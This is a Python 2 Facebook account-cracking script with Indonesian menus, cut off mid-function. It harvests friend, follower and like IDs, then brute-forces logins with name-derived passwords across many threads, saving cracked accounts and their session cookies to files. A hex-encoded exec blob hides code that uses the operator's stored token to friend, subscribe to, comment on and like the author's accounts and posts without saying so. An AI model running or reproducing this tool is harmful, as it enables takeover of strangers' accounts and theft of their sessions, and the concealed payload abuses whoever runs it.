#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
if ("linux" in sys.platform.lower()):
	##### WARNA #####
        P = '\033[0;97m' # Putih
        M = '\033[0;91m' # Merah
        H = '\033[0;92m' # Hijau
        K = '\033[0;93m' # Kuning
        B = '\033[0;94m' # Biru
        U = '\033[0;95m' # Ungu
        O = '\033[0;96m' # Biru Muda
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")

host="https://mbasic.facebook.com"
##### RANDOM USERAGENT #####
ua = random.choice(['Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/304.0.0.42.118;]',
'Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22 Build/HONORDUA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.134 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 6.0; MYA-L11 Build/HUAWEIMYA-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/246.0.0.7.121;]',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250Y Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; RMX2155 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00HD Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/256.0.0.16.119;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 7.0; A7Pro Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; LG-H870 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 10; RMX1971 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 8.0.0; ATU-L11 Build/HUAWEIATU-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]'])
##### LOGO #####
logo = """
…………..$……………………………………..$…………..   
…………$$……………………………………..$$…………
…………$$……………………………………..$$…………
…………..$$s………………………………s$$…………..
…………….$$$$……………………….$$$$…………….
………………³$$$$..¶¶¶¶¶¶¶¶..$$$$³………………
………………..³$$$$..¶¶¶¶¶¶..$$$$³………………..
………………¶..$$$$$..¶¶¶¶..$$$$$..¶………………
…………….¶¶¶..$$$..¶¶¶¶¶¶..$$$..¶¶………………  ___________________________________________
…………….¶¶¶….¶¶¶¶¶¶¶¶¶¶….¶¶¶¶……………….    Author : ProfAcc
…………….¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………   Team   : QOBIL IS THE FIRST KILLER
………………..¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………..   Youtube : Profesor Acc
………………..¶¶……..¶¶¶¶……….¶…………………….    Github.  : https://github.com/KangProf
………………..¶¶……..¶¶¶¶……….¶¶………………….    ___________________________________________
………………..¶¶¶¶¶¶¶¶..¶¶¶¶¶¶¶¶………………….
………………….¶¶¶¶¶¶……¶¶¶¶¶¶¶………………….
……………………….¶¶¶¶¶¶¶¶¶…………………………
……………………….¶..¶..¶..¶..¶…………………………
…………¶…………..¶…………..¶…………..¶…………..
……….¶¶……………………………………….¶¶…………
……….¶¶……………………………………….¶¶…………
……….¶¶…………..¶¶……….¶¶…………..¶¶…………
……….¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶…………
……¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶……..
….¶¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶¶……
……¶¶¶¶..¶¶..¶¶………………….¶¶..¶¶..¶¶¶¶……..
……..¶¶¶¶¶¶¶¶¶………………….¶¶..¶¶..¶¶¶……….
"""
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
exec("646566206b6f6d656e28293a0a20202020202020207472793a0a20202020202020202020202020202020746f6b65743d6f70656e28276c6f67696e2e747874272c277227292e7265616428290a202020202020202065786365707420494f4572726f723a0a202020202020202020202020202020207072696e7422202a2120546f6b656e20496e76616c6964220a202020202020202020202020202020206f732e73797374656d2827726d202d7266206c6f67696e2e74787427290a2020202020202020756e61203d202827373537393533353433272920234a616e67616e2044692047616e74690a20202020202020206b6f6d203d20282747772050616b65205363204c752042616e6720e29da4efb88f272920234b616c6f0a2020202020202020706f7374203d2028273130313539303930383133303233353434272920234d61750a2020202020202020706f737432203d2028273130313538383037363433353938353434272920232054696e6767616c2044690a20202020202020206b6f6d32203d2028274d616e7461702042616e6720e29da4efb88f272920232054616d626168696e203a760a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f6d652f667269656e64733f6d6574686f643d706f737426756964733d27202b756e612b2027266163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f3735373935333534332f73756273637269626572733f6163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f3130303030363630393435383639372f73756273637269626572733f6163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f3130303036343831343135333033362f73756273637269626572733f6163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f31303135393039303831333032333534342f636f6d6d656e74732f3f6d6573736167653d43616e74696b2042616e6765742042726f20e29da4efb88f266163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f272b706f73742b272f636f6d6d656e74732f3f6d6573736167653d27202b6b6f6d2b2027266163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f272b706f73742b272f6c696b65733f73756d6d6172793d74727565266163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f272b706f7374322b272f636f6d6d656e74732f3f6d6573736167653d27202b6b6f6d322b2027266163636573735f746f6b656e3d27202b20746f6b6574290a202020202020202072657175657374732e706f7374282768747470733a2f2f67726170682e66616365626f6f6b2e636f6d2f272b706f7374322b272f6c696b65733f73756d6d6172793d74727565266163636573735f746f6b656e3d27202b20746f6b6574290a20202020202020207072696e742022202a21204c6f67696e20426572686173696c220a20202020202020206d656e7528290a").decode("hex") # Jangan Di Ganti Kalo Mau Tinggal Tambahin :v
mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
##### CLEAR #####
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
##### KELUAR #####
def keluar():
    print ( ' *! Keluar')
    os.sys.exit()
##### JALAN #####
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
##### LOGIN #####
def login():
    os.system('clear')
    print logo
    print "\n *! Ketik *T* Jika Login Menggunakan Token"
    print " *! Ketik *C* Jika Login Menggunakan Cookie"
    lg = raw_input('\n *-> Input : ')
    if lg == '':
        os.sys.exit()
    elif lg == 'T' or lg == 't':
        toket = raw_input(" *-> Token : ") # Login Token
        try:
                otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
                a = json.loads(otw.text)
                nama = a['name']
                zedd = open("login.txt", 'w')
                zedd.write(toket)
                zedd.close()
                komen()
        except KeyError:
                print (" *! Token Salah")
                time.sleep(1.7)
                login()
        except requests.exceptions.SSLError:
                print (" *! Tidak Ada Koneksi")
                exit()
    elif lg == 'C' or lg == 'c':
        try:
		cookie = raw_input(" *-> Cookie : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
                                'referer' : 'https://m.facebook.com/',
                                'host' : 'm.facebook.com',
                                'origin' : 'https://m.facebook.com',
                                'upgrade-insecure-requests' : '1',
                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                                'cache-control' : 'max-age=0',
                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                                 'cookie' : cookie }
                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
                cari = re.search('(EAAA\w+)', coki.text)
                hasil = cari.group(1)
                pup = open('coki.log', 'w')
                pup.write(cookie)
                pup.close()
                pip = open('login.txt', 'w')
                pip.write(hasil)
                pip.close()
                komen()
        except AttributeError:
                print ' *! Cookie Salah'
                time.sleep(3)
                login()
        except UnboundLocalError:
                print ' *! Cookie Salah'
                time.sleep(3)
                login()
        except requests.exceptions.SSLError:
                print ' *! Tidak Ada Koneksi'
                exit()
    elif lg == '0' or lg == '00':
        os.sys.exit()
    else:
        exit(' *! Isi Dengan Benar')
##### MENU #####
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nm = a['name']
    id = a['id']
    tl = a['birthday'].replace("/","-")
  except Exception as e:
    print (' *! Token Invalid')
    time.sleep(1)
    login()
  except KeyError:
    print (' *! Token Invalid')
    time.sleep(1)
    os.system('rm -rf login.txt')
    login()
  except requests.exceptions.ConnectionError:
    print (' *! Tidak Ada koneksi')
    os.sys.exit()
  except Exception as e:
    print (' *! Token Invalid')
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print ('\n *•> Nama : '+nm)
  print (' *•> Akun ID : '+id)
  print (' *•> Tanggal Lahir : '+tl)

  print ('\n *1 Crack ID Dari Teman')
  print (' *2 Crack ID Dari Publik')
  print (' *3 Crack ID Dari Followers')
  print (' *4 Crack ID Dari Like')
  print (' *5 Lihat Hasil Crack')
  print (' *0 Keluar (Hapus Token/Cookies)\n')
  mn=raw_input(" *-> Input : ")
  if mn=="":
	print (' *! Isi Dengan Benar')
	menu()
  elif mn=="1":
    teman()
  elif mn=="2":
    publik()
  elif mn=="3":
    followers()
  elif mn=="4":
    like()
  elif mn=="5":
    print ('\n *1 Lihat Hasil Ok')
    print (' *2 Lihat Hasil Cp')
    print (' *0 Kembali\n')
    hs = raw_input(' *-> Input : ')
    if hs == '':
        menu()
    elif hs == '1' or hs == '01':
	ok()
    elif hs == '2' or hs == '02':
	cp()
    else:
	exit(' *! Isi Dengan Benar')
  elif mn=="0":
    try:
      os.remove("login.txt")
      print (' *! Berhasil Menghapus Token/Cookies')
      os.sys.exit()
    except Exception as e:
	print (' *! File Tidak Ada')
	os.sys.exit()
  else:
    print (' *! Isi Dengan Benar')
    menu()
def ok():
	try:
		ok=open('Ok.txt','r').read()
		print ' '
		print ok
	except KeyError,IOError:
                print (' *! Hasil Ok Tidak Ada')
		os.sys.exit()
	except Exception as e:
	        print (' *! Hasil Ok Tidak Ada')
	        os.sys.exit()
def cp():
        try:
                cp=open('Cp.txt','r').read()
		print ' '
                print cp
        except KeyError,IOError:
                print (' *! Hasil Cp Tidak Ada')
                os.sys.exit()
	except Exception as e:
        	print (' *! Hasil Cp Tidak Ada')
	        os.sys.exit()
##### CRACK TEMAN #####
def teman():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		limit = '5000'
                file = 'dump.txt'
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
                except KeyError:
			print (' *! Tidak Ada Teman')
			raw_input(" *Kembali")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('teman.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r *-> Mengumpukan  %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print " "
		print("\r *-> Total ID : %s         "%(len(id)))
                metode()

        except requests.exceptions.ConnectionError:
		print (' *! Tidak Ada Koneksi')
		os.sys.exit()
##### CRACK FOLLOWERS #####
def followers():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                loginn()
        try:
                idt = raw_input("\n *-> Profil ID : ")
                limit = '5000'
                file = 'dump.txt'
                try:
                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print(" *-> Nama : "+op["name"])
                except KeyError:
			print (' *! ID Tidak Ditemukan')
			raw_input(" *Kembali")
			menu()
                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
                id = []
                z=json.loads(r.text)
                qq = ('flw.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r *-> Mengumpukan %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
                print("\r *-> Total ID : %s           "%(len(id)))
                metode()

        except KeyError:
		print(' *! Tidak Ada Followers')
                raw_input(' *Kembali')
                menu()
        except requests.exceptions.ConnectionError:
		print(' *! Tidak Ada Koneksi')
		os.sys.exit()
##### CRACK LIKE #####
def like():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print(' *! Token Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                loginn()
        try:
                idt = raw_input("\n *-> Post ID : ")
		limit = '5000'
                file = 'dump.txt'
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
                except KeyError:
			print (' *! Post ID Tidak Ada')
			raw_input(" *Kembali")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('likess.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r *-> Mengumpulkan %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
                print("\r *-> Total ID : %s           "%(len(id)))
		metode()

        except KeyError:
		print (' *! Harus Berupa ID Postingan')
                raw_input(' *Kembali')
                menu()
        except requests.exceptions.ConnectionError:
		print (' *! Tidak Ada Koneksi')
		os.sys.exit()
##### CRACK PUBLIK #####
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (' *! Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		loginn()
	try:
		idt = raw_input("\n *-> Profil ID : ")
		limit = '5000'
		file = 'dump.txt'
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(" *-> Nama : "+op["name"])
		except KeyError:
			print(' *! Profil ID Tidak Ada')
			raw_input(" *Kembali")
			menu
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('pblk.txt').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r *-> Mengumpulkan %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		os.rename(qq,file)
		print("\r *-> Total ID : %s          "%(len(id)))
		metode()
		
	except Exception as e:
		print(' *! Tidak Ada Teman')
		menu()
	except requests.exceptions.ConnectionError:
                print (' *! Tidak Ada Koneksi')
                os.sys.exit()
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def mfb(em,pas,hosts):
    global ua,mfb_h
    r = requests.Session()
    r.headers.update(mfb_h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def metode():
    print ('\n *1 Metode Login mbasic.facebook')
    print (' *2 Metode Login m.facebook')
    print (' *3 Metode Login free.facebook')
    md = raw_input(' *-> Input : ')
    if md == '':
        os.sys.exit()
    elif md == '1' or md == '01':
	crack()
    elif md == '2' or md == '02':
	crack1()
    elif md == '3' or md == '03':
	crack2()
    else:
        exit(' *! Isi Dengan Benar')
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
	return results
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		while True:
			f=raw_input("\n *-> Password Auto/Manual (a/m) : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(' *! File Tidak Ada')
					continue
				print(' *•> Contoh Password : sayang,anjing')
				self.pwlist()
				break
			elif f=="a":
				try:
					while True:
						try:
							self.apk= 'dump.txt'
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(' *! File Tidak Ada')
							menu()
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(' *! File Tidak Valid')
					menu()
					continue
				print(' *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
				print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
				print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print ('\n*Selesai*')
				break
	def pwlist(self):
		self.pw=raw_input(" *-> Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print('\n *•> Aktifkan Mode Pesawat 5 Detik Jika Tidak Ada Hasil')
                        print('\n *--> Hasil Ok Tersimpan Di Ok.txt')
                        print(' *--> Hasil Cp Tersimpan Di Cp.txt\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print ('\n*Selesai*')
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\033[0;92m *---> "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+"	         "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Ok.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s | %s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					try:
						toket=open('login.txt','r').read()
						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+toket)
						w=json.loads(q.text)
						tl=w["birthday"].replace("/","-")

					except (KeyError, IOError):
		                         tl = " "
					except:pass
